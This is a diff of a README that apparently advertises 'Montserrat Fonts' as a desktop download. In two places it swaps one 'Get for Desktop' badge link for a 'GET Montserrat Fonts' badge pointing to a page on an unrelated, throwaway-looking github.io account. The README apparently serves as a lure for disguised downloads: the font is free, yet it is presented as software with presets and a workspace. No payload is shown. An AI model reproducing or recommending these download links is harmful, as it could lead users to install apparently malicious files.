@@ -4,11 +4,8 @@
   <img src="https://zsquarestudio.com/wp-content/uploads/blog-font-montserrat.jpg" alt="Montserrat Logo"/>
 </div>
 
-<div align="center">
+[![GET Montserrat Fonts](https://img.shields.io/badge/GET%20%E2%80%94%20Montserrat-Fonts-0078D6?style=for-the-badge&logoColor=white)](https://harrnrwll368.github.io/.github/Montserrat-Fonts)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://montserrat-fonts.github.io/.github/)
-
-</div>
 
 ---
 
@@ -28,11 +25,8 @@ Experienced typographers gain access to presets for montserrat roman font, monts
   <img src="https://p16-seeyou-useast5.capcutcdn-us.com/tos-useast5-i-2zwwjm3azk-tx/8eda5ffb90674524b8f3e363548692ae~tplv-2zwwjm3azk-image.image" alt="Montserrat Workspace Screenshot"/>
 </div>
 
-<div align="center">
+[![GET Montserrat Fonts](https://img.shields.io/badge/GET%20%E2%80%94%20Montserrat-Fonts-0078D6?style=for-the-badge&logoColor=white)](https://harrnrwll368.github.io/.github/Montserrat-Fonts)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://montserrat-fonts.github.io/.github/)
-
-</div>
 
 ---
 
